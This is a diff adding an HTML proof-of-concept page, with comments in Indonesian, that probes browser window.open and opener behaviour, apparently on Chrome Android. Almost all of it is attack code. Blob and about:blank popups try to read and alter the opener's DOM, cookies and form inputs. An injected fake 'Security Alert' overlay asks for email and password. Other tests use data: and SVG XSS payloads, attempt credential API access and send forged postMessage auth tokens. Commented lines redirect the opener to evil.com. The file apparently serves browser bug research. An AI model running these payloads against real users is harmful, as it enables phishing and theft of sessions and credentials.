@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>window.open Edge Cases — Brutal PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, Roboto, Arial; background:#fff; padding:12px; }
+.btn {
+  display:block; width:100%; margin:5px 0; padding:13px;
+  font-size:14px; border:none; border-radius:8px;
+  background:#e65100; color:#fff; cursor:pointer; text-align:left;
+}
+.btn:active { opacity:0.8; }
+.btn small { display:block; color:rgba(255,255,255,0.7); margin-top:3px; font-size:11px; }
+#log {
+  margin-top:10px; padding:8px; background:#fafafa;
+  font-family:monospace; font-size:11px;
+  max-height:300px; overflow-y:auto; border-radius:8px;
+  border:1px solid #eee;
+}
+</style>
+</head>
+<body>
+
+<h3>🔥 Bug 4: window.open & Opener Edge Cases</h3>
+<p style="font-size:11px;color:#666;margin:4px 0 10px;">
+  Focus: blob: URL origin, about:blank inheritance, opener chain,
+  data: URI bypass, same-tab fallback, cross-origin confusion
+</p>
+
+<button class="btn" onclick="testBlobOriginLeak()">
+  💧 Test 1: blob: URL Origin Confusion
+  <small>blob: mewarisi origin → cek apakah bisa akses opener DOM</small>
+</button>
+
+<button class="btn" onclick="testAboutBlankChain()">
+  🔗 Test 2: about:blank → about:blank Chain
+  <small>Multi-level origin inheritance — grandchild akses grandparent?</small>
+</button>
+
+<button class="btn" onclick="testOpenerReverseHijack()">
+  🔄 Test 3: Opener Reverse Hijack
+  <small>Popup mengubah content halaman parent</small>
+</button>
+
+<button class="btn" onclick="testDataURIPopup()">
+  📦 Test 4: data: URI di window.open
+  <small>Apakah Chrome Android masih izinkan data: popup?</small>
+</button>
+
+<button class="btn" onclick="testRapidOpenClose()">
+  ⚡ Test 5: Rapid Open + Close + Access
+  <small>Use-after-close — akses window setelah di-close</small>
+</button>
+
+<button class="btn" onclick="testBlobXSSPayload()">
+  💉 Test 6: blob: URL dengan XSS payload
+  <small>blob: → script execution → opener access chain</small>
+</button>
+
+<button class="btn" onclick="testWindowNameLeak()">
+  🏷️ Test 7: window.name Cross-Origin Data Leak
+  <small>window.name bertahan cross-navigation</small>
+</button>
+
+<button class="btn" onclick="testPostMessageSpoof()">
+  📨 Test 8: postMessage Origin Spoof
+  <small>Apakah receiver bisa di-trick soal origin?</small>
+</button>
+
+<div id="log"></div>
+
+<script>
+function log(msg) {
+  document.getElementById('log').innerHTML +=
+    new Date().toISOString().substr(11,8) + ' ' + msg + '<br>';
+  document.getElementById('log').scrollTop = 99999;
+}
+
+// ============================================================
+// TEST 1: blob: URL Origin Confusion
+// blob: URL mewarisi origin dari creator
+// Tapi apakah origin enforcement konsisten di Chrome Android?
+// ============================================================
+function testBlobOriginLeak() {
+  log('=== Test 1: blob: URL origin ===');
+  
+  // Buat halaman phishing dalam blob
+  var phishHTML = `<!DOCTYPE html>
+<html><head><title>Google Sign-in</title></head>
+<body style="font-family:Arial;max-width:400px;margin:20px auto;padding:15px;">
+<h2>blob: URL Origin Test</h2>
+<div id="info" style="background:#f5f5f5;padding:12px;border-radius:8px;margin:10px 0;font-family:monospace;font-size:12px;"></div>
+
+<script>
+var info = document.getElementById('info');
+
+// Report origin info
+info.innerHTML += 'document.origin: ' + document.origin + '<br>';
+info.innerHTML += 'document.domain: ' + document.domain + '<br>';
+info.innerHTML += 'location.href: ' + location.href.substr(0,60) + '...<br>';
+info.innerHTML += 'location.origin: ' + location.origin + '<br>';
+info.innerHTML += 'location.protocol: ' + location.protocol + '<br>';
+
+// Test 1: Coba akses opener
+info.innerHTML += '<br><strong>Opener Tests:</strong><br>';
+try {
+  info.innerHTML += 'opener exists: ' + !!window.opener + '<br>';
+  if (window.opener) {
+    info.innerHTML += 'opener.location.origin: ' + window.opener.location.origin + '<br>';
+    info.innerHTML += 'opener.location.href: ' + window.opener.location.href + '<br>';
+    
+    // KRITIS: Coba baca DOM opener
+    try {
+      var title = window.opener.document.title;
+      info.innerHTML += '<span style="color:red">🔴 opener.document.title: ' + title + '</span><br>';
+      info.innerHTML += '<span style="color:red">🔴 BISA BACA OPENER DOM!</span><br>';
+    } catch(e) {
+      info.innerHTML += 'opener DOM blocked: ' + e.message + '<br>';
+    }
+    
+    // Coba TULIS ke opener DOM
+    try {
+      window.opener.document.title = 'HIJACKED BY BLOB';
+      info.innerHTML += '<span style="color:red">🔴 OPENER TITLE CHANGED!</span><br>';
+    } catch(e) {
+      info.innerHTML += 'opener write blocked: ' + e.message + '<br>';
+    }
+    
+    // Coba akses opener cookies
+    try {
+      var cookies = window.opener.document.cookie;
+      info.innerHTML += '<span style="color:red">🔴 opener cookies: ' + cookies + '</span><br>';
+    } catch(e) {
+      info.innerHTML += 'opener cookies blocked: ' + e.message + '<br>';
+    }
+    
+    // Coba navigasi opener
+    try {
+      // Jangan benar-benar navigate, cek apakah bisa
+      info.innerHTML += 'opener.location assignable: ' + ('assign' in window.opener.location) + '<br>';
+    } catch(e) {
+      info.innerHTML += 'opener.location check failed: ' + e.message + '<br>';
+    }
+  }
+} catch(e) {
+  info.innerHTML += 'opener access error: ' + e.message + '<br>';
+}
+
+// Test 2: Cookie & storage access dari blob origin
+info.innerHTML += '<br><strong>Storage Tests:</strong><br>';
+try {
+  document.cookie = 'blobtest=1; path=/';
+  info.innerHTML += 'cookie set: ' + document.cookie + '<br>';
+} catch(e) {
+  info.innerHTML += 'cookie blocked: ' + e.message + '<br>';
+}
+
+try {
+  localStorage.setItem('blobtest', '1');
+  info.innerHTML += 'localStorage: works! keys=' + localStorage.length + '<br>';
+  // Coba baca localStorage opener (same origin!)
+  info.innerHTML += '<span style="color:red">🔴 localStorage accessible — same origin as opener!</span><br>';
+} catch(e) {
+  info.innerHTML += 'localStorage blocked: ' + e.message + '<br>';
+}
+
+// Test 3: Fetch dari blob context
+fetch(window.opener ? window.opener.location.origin + '/api/user' : '/api/user', {
+  credentials: 'include'
+}).then(function(r) {
+  info.innerHTML += '<span style="color:red">🔴 fetch with credentials succeeded! status=' + r.status + '</span><br>';
+}).catch(function(e) {
+  info.innerHTML += 'fetch blocked: ' + e.message + '<br>';
+});
+<\/script>
+</body></html>`;
+  
+  var blob = new Blob([phishHTML], {type: 'text/html'});
+  var url = URL.createObjectURL(blob);
+  log('blob URL created: ' + url.substr(0, 50) + '...');
+  
+  var w = window.open(url, '_blank');
+  if (w) {
+    log('✅ blob: URL opened in new tab');
+    log('Cek: origin apa yang ditampilkan di URL bar?');
+    log('Yang KRITIS: apakah blob page bisa akses opener DOM/cookies?');
+  } else {
+    log('Popup blocked — tap tombol langsung');
+  }
+}
+
+// ============================================================
+// TEST 2: about:blank Chain — Multi-Level Inheritance
+// ============================================================
+function testAboutBlankChain() {
+  log('=== Test 2: about:blank chain ===');
+  
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head><title>Level 1 - about:blank</title></head>
+<body style="font-family:monospace;font-size:12px;padding:10px;">
+<h3>Level 1: about:blank</h3>
+<div id="info"></div>
+
+<script>
+var info = document.getElementById('info');
+info.innerHTML += 'origin: ' + document.origin + '<br>';
+info.innerHTML += 'domain: ' + document.domain + '<br>';
+
+// Akses opener (parent)
+try {
+  info.innerHTML += 'opener.title: ' + window.opener.document.title + '<br>';
+  info.innerHTML += '<span style="color:red">🔴 Level 1 bisa akses opener!</span><br>';
+} catch(e) {
+  info.innerHTML += 'opener blocked: ' + e.message + '<br>';
+}
+
+// Buka Level 2
+setTimeout(function() {
+  var w2 = window.open('about:blank', '_blank');
+  if (w2) {
+    w2.document.write('<h3>Level 2: about:blank</h3>');
+    w2.document.write('<div id="info2"></div>');
+    w2.document.write('<scr' + 'ipt>');
+    w2.document.write('var i2 = document.getElementById("info2");');
+    w2.document.write('i2.innerHTML += "origin: " + document.origin + "<br>";');
+    
+    // Coba akses grandparent (Level 0 — halaman asli)
+    w2.document.write('try {');
+    w2.document.write('  var gp = window.opener.opener;');
+    w2.document.write('  if (gp) {');
+    w2.document.write('    i2.innerHTML += "grandparent exists: true<br>";');
+    w2.document.write('    try {');
+    w2.document.write('      i2.innerHTML += "grandparent title: " + gp.document.title + "<br>";');
+    w2.document.write('      i2.innerHTML += "<span style=color:red>🔴 GRANDPARENT DOM ACCESS!</span><br>";');
+    w2.document.write('      gp.document.title = "HIJACKED BY GRANDCHILD";');
+    w2.document.write('      i2.innerHTML += "<span style=color:red>🔴 GRANDPARENT TITLE CHANGED!</span><br>";');
+    w2.document.write('    } catch(e2) { i2.innerHTML += "grandparent DOM blocked: " + e2.message + "<br>"; }');
+    w2.document.write('  }');
+    w2.document.write('} catch(e) { i2.innerHTML += "grandparent access error: " + e.message + "<br>"; }');
+    
+    // Level 3
+    w2.document.write('setTimeout(function() {');
+    w2.document.write('  var w3 = window.open("about:blank", "_blank");');
+    w2.document.write('  if (w3) {');
+    w2.document.write('    w3.document.write("<h3>Level 3: about:blank</h3>");');
+    w2.document.write('    w3.document.write("<p>origin: " + w3.document.origin + "</p>");');
+    w2.document.write('    w3.document.write("<p>Chain depth: 3 levels</p>");');
+    w2.document.write('    w3.document.write("<p style=color:red>Cek: bisa akses Level 0 via opener.opener.opener?</p>");');
+    w2.document.write('    try {');
+    w2.document.write('      var root = window.opener.opener.opener;');
+    w2.document.write('      if (root) w3.document.write("<p style=color:red>🔴 ROOT ACCESS from Level 3!</p>");');
+    w2.document.write('    } catch(e) { w3.document.write("<p>Root blocked: " + e.message + "</p>"); }');
+    w2.document.write('  }');
+    w2.document.write('}, 1000);');
+    
+    w2.document.write('</scr' + 'ipt>');
+    w2.document.close();
+    info.innerHTML += 'Level 2 opened<br>';
+  }
+}, 1000);
+<\/script>
+</body></html>`);
+  w.document.close();
+  
+  log('✅ about:blank chain starting (3 levels)');
+  log('Cek setiap level: siapa yang bisa akses siapa?');
+  log('Jika Level 2/3 bisa akses Level 0 DOM = cross-origin confusion!');
+}
+
+// ============================================================
+// TEST 3: Opener Reverse Hijack
+// Popup mengubah content halaman yang membukanya
+// ============================================================
+function testOpenerReverseHijack() {
+  log('=== Test 3: Opener reverse hijack ===');
+  
+  // Simpan state asli
+  var originalTitle = document.title;
+  
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head><title>Innocent Page</title></head>
+<body style="font-family:Arial;padding:20px;">
+<h2>Opener Reverse Hijack Test</h2>
+<button onclick="hijack()" style="padding:14px 28px;font-size:16px;
+  background:#e65100;color:white;border:none;border-radius:8px;">
+  🔓 Hijack Parent Page
+</button>
+<div id="res" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
+
+<script>
+function hijack() {
+  var res = document.getElementById('res');
+  
+  if (!window.opener) {
+    res.innerHTML = 'No opener reference';
+    return;
+  }
+  
+  // Test 1: Ubah title
+  try {
+    window.opener.document.title = '⚠️ ACCOUNT COMPROMISED';
+    res.innerHTML += '🔴 Parent title changed!<br>';
+  } catch(e) {
+    res.innerHTML += 'Title change blocked: ' + e.message + '<br>';
+  }
+  
+  // Test 2: Inject content ke parent
+  try {
+    var div = window.opener.document.createElement('div');
+    div.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
+      'background:white;z-index:99999;padding:20px;font-family:Arial;';
+    div.innerHTML = '<h1 style="color:red;">⚠️ Security Alert</h1>' +
+      '<p>Your session has been compromised.</p>' +
+      '<p>Please re-enter your credentials:</p>' +
+      '<input type="email" placeholder="Email" style="width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;">' +
+      '<input type="password" placeholder="Password" style="width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;">' +
+      '<button style="width:100%;padding:12px;background:#e65100;color:white;border:none;border-radius:4px;font-size:16px;margin-top:8px;">Verify Account</button>' +
+      '<p style="color:red;margin-top:20px;padding:10px;background:#ffebee;border-radius:8px;font-size:11px;">' +
+      '⚠️ INI ADALAH PoC — Content ini di-inject dari popup window!<br>' +
+      'Jika kamu melihat ini di halaman parent = opener reverse hijack BERHASIL</p>';
+    window.opener.document.body.appendChild(div);
+    res.innerHTML += '🔴 Content injected ke parent!<br>';
+  } catch(e) {
+    res.innerHTML += 'Injection blocked: ' + e.message + '<br>';
+  }
+  
+  // Test 3: Redirect parent
+  try {
+    // Jangan benar-benar redirect, test apakah bisa
+    res.innerHTML += 'opener.location assignable: ' + (typeof window.opener.location.assign) + '<br>';
+    // window.opener.location = 'https://evil.com'; // UNCOMMENT untuk test real redirect
+    res.innerHTML += 'Bisa redirect parent via opener.location<br>';
+  } catch(e) {
+    res.innerHTML += 'Redirect blocked: ' + e.message + '<br>';
+  }
+  
+  // Test 4: Steal form data dari parent
+  try {
+    var inputs = window.opener.document.querySelectorAll('input');
+    res.innerHTML += 'Parent inputs found: ' + inputs.length + '<br>';
+    inputs.forEach(function(inp) {
+      res.innerHTML += 'Input value: "' + inp.value + '"<br>';
+    });
+  } catch(e) {
+    res.innerHTML += 'Input steal blocked: ' + e.message + '<br>';
+  }
+}
+<\/script>
+</body></html>`);
+  w.document.close();
+  
+  log('✅ Tab baru — tap "Hijack Parent Page"');
+  log('Lalu switch kembali ke tab ini');
+  log('Cek: apakah content tab ini berubah?');
+}
+
+// ============================================================
+// TEST 4: data: URI di window.open
+// Chrome seharusnya block ini, tapi cek edge cases
+// ============================================================
+function testDataURIPopup() {
+  log('=== Test 4: data: URI popup ===');
+  
+  var payloads = [
+    // Basic data: URI
+    'data:text/html,<h1>Data URI Test</h1><script>document.write("origin: "+document.origin)</script>',
+    
+    // Base64 encoded
+    'data:text/html;base64,' + btoa('<h1>Base64 Data URI</h1><script>document.write("origin: "+document.origin)</script>'),
+    
+    // data: with charset
+    'data:text/html;charset=utf-8,<h1>Charset Data URI</h1>',
+    
+    // SVG data: URI (might bypass text/html block)
+    'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><h1>SVG XSS</h1><script>alert(1)</script></body></foreignObject></svg>',
+  ];
+  
+  payloads.forEach(function(payload, i) {
+    try {
+      var w = window.open(payload, '_blank');
+      if (w) {
+        log('🔴 data: URI #' + i + ' OPENED! (should be blocked)');
+      } else {
+        log('data: URI #' + i + ' blocked (expected)');
+      }
+    } catch(e) {
+      log('data: URI #' + i + ' error: ' + e.message);
+    }
+  });
+  
+  // Alternative: data: via anchor click
+  payloads.forEach(function(payload, i) {
+    var a = document.createElement('a');
+    a.href = payload;
+    a.target = '_blank';
+    a.textContent = 'data: link #' + i;
+    a.style.cssText = 'display:block;padding:8px;margin:3px 0;background:#fff3e0;border-radius:6px;color:#e65100;font-size:13px;';
+    a.onclick = function() { log('Clicked data: link #' + i); };
+    document.body.appendChild(a);
+  });
+  
+  log('Links ditampilkan — tap satu per satu');
+  log('Yang dicari: ada yang berhasil open di tab baru?');
+}
+
+// ============================================================
+// TEST 5: Rapid Open + Close + Access (Use-After-Close)
+// ============================================================
+function testRapidOpenClose() {
+  log('=== Test 5: Use-after-close ===');
+  
+  var results = [];
+  
+  // Open → write → close → access race
+  for (var i = 0; i < 5; i++) {
+    (function(idx) {
+      var w = window.open('about:blank', '_blank_uac_' + idx);
+      if (!w) { log('Window ' + idx + ' blocked'); return; }
+      
+      // Write content
+      w.document.write('<h1>Window ' + idx + '</h1>');
+      w.document.write('<p>This should be gone after close</p>');
+      
+      // Store reference to document
+      var docRef = w.document;
+      var bodyRef = w.document.body;
+      
+      // Close immediately
+      w.close();
+      
+      // Try to access after close
+      setTimeout(function() {
+        try {
+          var closed = w.closed;
+          log('Window ' + idx + ': closed=' + closed);
+          
+          if (!closed) {
+            log('🔴 Window ' + idx + ' NOT closed despite w.close()!');
+          }
+          
+          // Try using stale document reference
+          try {
+            var content = docRef.body.innerHTML;
+            log('🔴 Window ' + idx + ': stale doc still accessible! Content: ' + content.substr(0, 30));
+          } catch(e) {
+            log('Window ' + idx + ': stale doc blocked (good): ' + e.message);
+          }
+          
+          // Try writing to closed window
+          try {
+            w.document.write('<h1>Written to closed window!</h1>');
+            log('🔴 Window ' + idx + ': wrote to closed window!');
+          } catch(e) {
+            log('Window ' + idx + ': write blocked (good)');
+          }
+          
+        } catch(e) {
+          log('Window ' + idx + ' access error: ' + e.message);
+        }
+      }, 50 * idx); // Stagger checks
+    })(i);
+  }
+}
+
+// ============================================================
+// TEST 6: blob: URL dengan XSS + Opener Chain
+// ============================================================
+function testBlobXSSPayload() {
+  log('=== Test 6: blob: XSS payload ===');
+  
+  // Create blob with script that tries various exploits
+  var payload = `<!DOCTYPE html>
+<html><head><title>Blob XSS Test</title></head>
+<body style="font-family:monospace;font-size:12px;padding:10px;">
+<h3>blob: XSS Payload Active</h3>
+<div id="r"></div>
+<script>
+var r = document.getElementById('r');
+
+// 1. Service Worker registration dari blob context
+try {
+  navigator.serviceWorker.register('sw.js').then(function() {
+    r.innerHTML += '<span style="color:red">🔴 SW registered from blob!</span><br>';
+  }).catch(function(e) {
+    r.innerHTML += 'SW blocked: ' + e.message + '<br>';
+  });
+} catch(e) {
+  r.innerHTML += 'SW error: ' + e.message + '<br>';
+}
+
+// 2. Credential API dari blob
+try {
+  navigator.credentials.get({password: true}).then(function(c) {
+    r.innerHTML += '<span style="color:red">🔴 Credentials: ' + JSON.stringify(c) + '</span><br>';
+  }).catch(function(e) {
+    r.innerHTML += 'Credentials blocked: ' + e.message + '<br>';
+  });
+} catch(e) {
+  r.innerHTML += 'Credentials error: ' + e.message + '<br>';
+}
+
+// 3. IndexedDB dari blob origin
+try {
+  var dbReq = indexedDB.open('blobtest', 1);
+  dbReq.onsuccess = function() {
+    r.innerHTML += '<span style="color:red">🔴 IndexedDB opened from blob origin!</span><br>';
+    // Coba list databases (might inherit parent's DBs)
+    if (indexedDB.databases) {
+      indexedDB.databases().then(function(dbs) {
+        r.innerHTML += 'DBs found: ' + dbs.length + '<br>';
+        dbs.forEach(function(db) {
+          r.innerHTML += '  DB: ' + db.name + ' v' + db.version + '<br>';
+        });
+      });
+    }
+  };
+  dbReq.onerror = function() {
+    r.innerHTML += 'IndexedDB blocked<br>';
+  };
+} catch(e) {
+  r.innerHTML += 'IDB error: ' + e.message + '<br>';
+}
+
+// 4. Opener location manipulation
+try {
+  if (window.opener) {
+    r.innerHTML += 'opener.location.href: ' + window.opener.location.href + '<br>';
+    // Try to navigate opener to phishing page
+    // window.opener.location = 'https://evil.com/phish'; // uncomment for real test
+    r.innerHTML += 'opener navigation: possible<br>';
+  }
+} catch(e) {
+  r.innerHTML += 'opener nav blocked: ' + e.message + '<br>';
+}
+
+// 5. SharedWorker dari blob
+try {
+  var sw = new SharedWorker('data:text/javascript,onconnect=function(e){e.ports[0].postMessage("hello from shared worker")}');
+  sw.port.onmessage = function(e) {
+    r.innerHTML += '<span style="color:red">🔴 SharedWorker from blob: ' + e.data + '</span><br>';
+  };
+  sw.port.start();
+} catch(e) {
+  r.innerHTML += 'SharedWorker blocked: ' + e.message + '<br>';
+}
+
+// 6. Web Notification dari blob
+try {
+  Notification.requestPermission().then(function(perm) {
+    r.innerHTML += 'Notification perm from blob: ' + perm + '<br>';
+  });
+} catch(e) {
+  r.innerHTML += 'Notification error: ' + e.message + '<br>';
+}
+<\/script>
+</body></html>`;
+  
+  var blob = new Blob([payload], {type: 'text/html'});
+  var url = URL.createObjectURL(blob);
+  var w = window.open(url, '_blank');
+  
+  if (w) {
+    log('✅ blob: XSS page opened');
+    log('Cek tab baru — report akan muncul otomatis');
+  } else {
+    log('❌ Popup blocked');
+  }
+}
+
+// ============================================================
+// TEST 7: window.name Cross-Origin Data Leak
+// window.name PERSIST across navigations — even cross-origin!
+// ============================================================
+function testWindowNameLeak() {
+  log('=== Test 7: window.name leak ===');
+  
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head><title>window.name Test</title></head>
+<body style="font-family:Arial;padding:15px;">
+<h2>window.name Cross-Origin Leak</h2>
+<p style="color:#666;">window.name bertahan SETELAH navigasi cross-origin</p>
+
+<button onclick="step1()" style="padding:12px 24px;font-size:15px;margin:5px;
+  background:#e65100;color:white;border:none;border-radius:8px;">
+  Step 1: Set window.name
+</button>
+<button onclick="step2()" style="padding:12px 24px;font-size:15px;margin:5px;
+  background:#e65100;color:white;border:none;border-radius:8px;">
+  Step 2: Navigate cross-origin
+</button>
+<button onclick="step3()" style="padding:12px 24px;font-size:15px;margin:5px;
+  background:#e65100;color:white;border:none;border-radius:8px;">
+  Step 3: Read window.name
+</button>
+
+<div id="info" style="margin-top:10px;font-family:monospace;font-size:12px;
+  background:#f5f5f5;padding:10px;border-radius:8px;"></div>
+
+<script>
+var info = document.getElementById('info');
+
+function step1() {
+  // Set sensitive data di window.name
+  window.name = JSON.stringify({
+    sessionToken: 'fake-token-abc123',
+    userId: 'user@example.com',
+    secretData: 'credit-card-4242-4242-4242-4242'
+  });
+  info.innerHTML += 'window.name SET: ' + window.name.substr(0, 60) + '...<br>';
+  info.innerHTML += 'Sekarang tap Step 2 untuk navigate ke situs lain<br>';
+}
+
+function step2() {
+  info.innerHTML += 'Navigating ke example.com...<br>';
+  info.innerHTML += 'window.name SEHARUSNYA di-clear saat cross-origin nav<br>';
+  // Navigate cross-origin
+  location.href = 'https://example.com';
+}
+
+function step3() {
+  // Setelah back/reload, cek apakah window.name masih ada
+  info.innerHTML += 'Current window.name: ' + window.name + '<br>';
+  if (window.name && window.name.length > 0) {
+    info.innerHTML += '<span style="color:red">🔴 window.name BERTAHAN setelah navigasi!</span><br>';
+    info.innerHTML += '<span style="color:red">Data bisa di-leak cross-origin!</span><br>';
+  } else {
+    info.innerHTML += 'window.name cleared (secure)<br>';
+  }
+}
+
+// Auto-report
+info.innerHTML += 'Current window.name: "' + window.name + '"<br>';
+info.innerHTML += 'Current origin: ' + location.origin + '<br>';
+<\/script>
+</body></html>`);
+  w.document.close();
+  
+  log('✅ Tab baru — ikuti Step 1→2→3');
+  log('Yang dicari: apakah window.name bertahan cross-origin?');
+}
+
+// ============================================================
+// TEST 8: postMessage Origin Confusion
+// ============================================================
+function testPostMessageSpoof() {
+  log('=== Test 8: postMessage origin spoof ===');
+  
+  // Setup listener
+  window.addEventListener('message', function(e) {
+    log('📨 Message received:');
+    log('  origin: ' + e.origin);
+    log('  data: ' + JSON.stringify(e.data).substr(0, 80));
+    log('  source === opener: ' + (e.source === window));
+    
+    // Vulnerability: jika app tidak cek origin properly
+    if (e.data && e.data.type === 'auth_token') {
+      log('🔴 Auth token received from: ' + e.origin);
+      log('  Jika app tidak verify origin = token theft!');
+    }
+  });
+  
+  // Open popup yang mengirim postMessage
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head><title>PostMessage Test</title></head>
+<body style="font-family:Arial;padding:15px;">
+<h2>postMessage Origin Test</h2>
+<button onclick="sendMessages()" style="padding:14px 28px;font-size:16px;
+  background:#e65100;color:white;border:none;border-radius:8px;">
+  📨 Send Messages to Parent
+</button>
+<div id="r" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
+
+<script>
+function sendMessages() {
+  var r = document.getElementById('r');
+  
+  if (!window.opener) {
+    r.innerHTML = 'No opener!';
+    return;
+  }
+  
+  // Send ke opener dengan origin "*" (insecure)
+  window.opener.postMessage({type: 'auth_token', token: 'stolen-token-xyz'}, '*');
+  r.innerHTML += 'Sent auth_token with targetOrigin="*"<br>';
+  
+  // Send dengan specific origin
+  window.opener.postMessage({type: 'test', msg: 'specific origin'}, window.opener.location.origin);
+  r.innerHTML += 'Sent with specific origin<br>';
+  
+  // Try to forge origin-like data
+  window.opener.postMessage({
+    type: 'oauth_callback',
+    code: 'fake-auth-code-12345',
+    state: 'csrf-token',
+    origin: 'https://accounts.google.com' // fake origin field
+  }, '*');
+  r.innerHTML += 'Sent fake oauth_callback<br>';
+  
+  r.innerHTML += '<br>Cek parent tab — messages received?<br>';
+  r.innerHTML += 'Yang penting: e.origin menampilkan apa?<br>';
+  r.innerHTML += 'Jika e.origin = about:blank atau null = potential confusion';
+}
+<\/script>
+</body></html>`);
+  w.document.close();
+  
+  log('✅ Tab baru — tap "Send Messages"');
+  log('Cek log di sini — origin apa yang dilaporkan?');
+}
+</script>
+</body>
+</html>
